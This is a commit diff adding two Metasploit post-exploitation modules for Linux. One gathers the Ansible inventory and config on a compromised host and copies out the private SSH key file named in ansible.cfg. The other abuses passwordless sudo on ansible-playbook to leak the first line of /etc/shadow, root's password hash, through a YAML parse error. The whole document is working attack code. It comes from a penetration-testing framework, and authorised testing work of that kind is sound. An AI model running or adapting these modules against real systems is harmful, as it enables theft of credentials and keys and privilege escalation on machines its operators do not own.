c911ec1413b2447cbd186739a6b0eec48ea44f85
h00die <michaeltcyr@gmail.com>
2023-12-16 07:16:26 -0500

    ansible collection

---
+++ modules/post/linux/gather/ansible.rb
@@ -0,0 +1,135 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Post
+  include Msf::Post::File
+  include Msf::Auxiliary::Report
+
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Ansible Config Gather',
+        'Description' => %q{
+          This module will grab ansible information including hosts, ping status, and the configuration file.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [
+          'h00die', # Metasploit Module
+        ],
+        'Platform' => ['linux', 'unix'],
+        'SessionTypes' => ['shell', 'meterpreter'],
+        'References' => [
+        ],
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'Reliability' => [],
+          'SideEffects' => []
+        }
+      )
+    )
+
+    register_options(
+      [
+        OptString.new('ANSIBLE', [true, 'Ansible executable location', '']),
+        OptString.new('ANSIBLEINVENTORY', [true, 'Ansible-inventory executable location', '']),
+        OptString.new('ANSIBLECFG', [true, 'Ansible config file location', '']),
+        OptString.new('HOSTS', [ true, 'Which ansible hosts to target', 'all' ]),
+      ], self.class
+    )
+  end
+
+  def ansible_exe
+    return @ansible if @ansible
+
+    ['/usr/local/bin/ansible', datastore['ANSIBLE']].each do |exec|
+      next unless file?(exec)
+      next unless executable?(exec)
+
+      @ansible = exec
+    end
+    @ansible
+  end
+
+  def ansible_inventory
+    return @ansible_inv if @ansible_inv
+
+    ['/usr/local/bin/ansible-inventory', datastore['ANSIBLEINVENTORY']].each do |exec|
+      next unless file?(exec)
+      next unless executable?(exec)
+
+      @ansible_inv = exec
+    end
+    @ansible_inv
+  end
+
+  def ansible_cfg
+    return @ansible_cfg if @ansible_cfg
+
+    ['/etc/ansible/ansible.cfg', datastore['ANSIBLECFG']].each do |f|
+      next unless file?(f)
+
+      @ansible_cfg = f
+    end
+    @ansible_cfg
+  end
+
+  def ping_hosts
+    results = cmd_exec("#{ansible_exe} #{datastore['HOSTS']} -m ping -o")
+    l = store_loot('ansible.ping', 'text/plain', session, results, 'ansible.ping', 'Ansible ping status')
+    print_good("Stored pings to: #{l}")
+    columns = ['Host', 'Status', 'Ping', 'Changed']
+    table = Rex::Text::Table.new('Header' => 'Ansible Pings', 'Indent' => 1, 'Columns' => columns)
+    # here's a regex with test: https://rubular.com/r/FMHhWx8QlVnidA
+    regex = /(\S+)\s+\|\s+([A-Z]+)\s+=>\s+({.+})$/
+    matches = results.scan(regex)
+
+    matches.each do |match|
+      match[2] = JSON.parse(match[2])
+      table << [match[0], match[1], match[2]['ping'], match[2]['changed']]
+    end
+    print_good(table.to_s) unless table.rows.empty?
+  end
+
+  def conf
+    return unless file?(ansible_cfg)
+
+    f = read_file(ansible_cfg)
+    l = store_loot('ansible.cfg', 'text/plain', session, f, 'ansible.cfg', 'Ansible config file')
+    print_good("Stored config to: #{l}")
+    f.lines.each do |line|
+      next unless line.start_with?('private_key_file')
+
+      file = line.split(' = ')[1].strip
+      print_good("Private key file location: #{file}")
+      next unless file?(file)
+
+      key = read_file(file)
+      l = store_loot('ansible.private.key', 'text/plain', session, key, 'private.key', 'Ansible private key')
+      print_good("Stored private key file to: #{l}")
+    end
+  end
+
+  def hosts_list
+    hosts = cmd_exec("#{ansible_inventory} --list")
+    hosts = JSON.parse(hosts)
+    l = store_loot('ansible.inventory', 'application/json', session, hosts, 'ansible_inventory.json', 'Ansible inventory')
+    print_good("Stored inventory to: #{l}")
+    columns = ['Host', 'Connection']
+    table = Rex::Text::Table.new('Header' => 'Ansible Hosts', 'Indent' => 1, 'Columns' => columns)
+    hosts = hosts.dig('_meta', 'hostvars')
+    hosts.each do |host|
+      table << [host[0], host[1]['ansible_connection']]
+    end
+    print_good(table.to_s) unless table.rows.empty?
+  end
+
+  def run
+    fail_with(Failure::NotFound, 'Ansible executable not found') if ansible_exe.nil?
+    hosts_list
+    ping_hosts
+    conf
+  end
+end
---
+++ modules/post/linux/gather/ansible_playbook_error_message_file_reader.rb
@@ -0,0 +1,96 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Post
+  include Msf::Post::File
+  include Msf::Auxiliary::Report
+
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Ansible Playbook Error Message File Reader',
+        'Description' => %q{
+          This module will read the first line of a file based on an error message from ansible-playbook with sudo privileges.
+          ansible-playbook takes a yaml file as input, and if there is an error, such as a non-yaml file, it outputs the line
+          where the error occurs. This can be exploited to read the first line of the file, which we'll typically want to read
+          /etc/shadow to obtain root's hash.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [
+          'h00die', # Metasploit Module
+          'rioasmara'
+        ],
+        'Platform' => ['linux', 'unix'],
+        'SessionTypes' => ['shell', 'meterpreter'],
+        'References' => [
+          ['URL', 'https://rioasmara.com/2022/03/21/ansible-playbook-weaponization/']
+        ],
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'Reliability' => [],
+          'SideEffects' => []
+        }
+      )
+    )
+
+    register_options(
+      [
+        OptString.new('ANSIBLEPLAYBOOK', [true, 'Ansible-playbook executable location', '']),
+        OptString.new('FILE', [true, 'File to read the first line of', '/etc/shadow']),
+      ], self.class
+    )
+  end
+
+  def ansible_exe
+    return @ansible if @ansible
+
+    ['/usr/local/bin/ansible-playbook', '/usr/bin/ansible-playbook', datastore['ANSIBLEPLAYBOOK']].each do |exec|
+      next unless file?(exec)
+      next unless executable?(exec)
+
+      @ansible = exec
+    end
+    @ansible
+  end
+
+  def run
+    fail_with(Failure::NotFound, 'Ansible-playbook executable not found') if ansible_exe.nil?
+    fail_with(Failure::NotFound, "Target file to read not found: #{datastore['file']}") unless file?(datastore['FILE'])
+
+    vprint_status('Checking sudo')
+    # check we can sudo
+    cmd = 'sudo -n -l'
+    print_status "Executing: #{cmd}"
+    output = cmd_exec(cmd).to_s
+
+    if !output || output.start_with?('usage:') || output.include?('illegal option') || output.include?('a password is required')
+      print_error('Current user could not execute sudo -l')
+      fail_with(Failure::NoAccess, 'Unable to execute the sudo command')
+    end
+
+    can_sudo_playbook = false
+    output.lines.each do |line|
+      next unless line.include? 'ansible-playbook'
+      next unless line.include? 'NOPASSWD'
+
+      can_sudo_playbook = true
+    end
+    fail_with(Failure::NoAccess, "ansible-playbook can't be run with a passwordless sudo") unless can_sudo_playbook
+
+    cmd = "sudo -n #{ansible_exe} #{datastore['FILE']}"
+    print_status "Executing: #{cmd}"
+    output = cmd_exec(cmd).to_s
+
+    # output will look similar to this:
+    # The offending line appears to be:
+    #
+    #
+    # root:!::0:::::
+    # ^ here
+    # we want to take the 2nd to last line.
+    print_good(output.lines[-2].strip)
+  end
+end
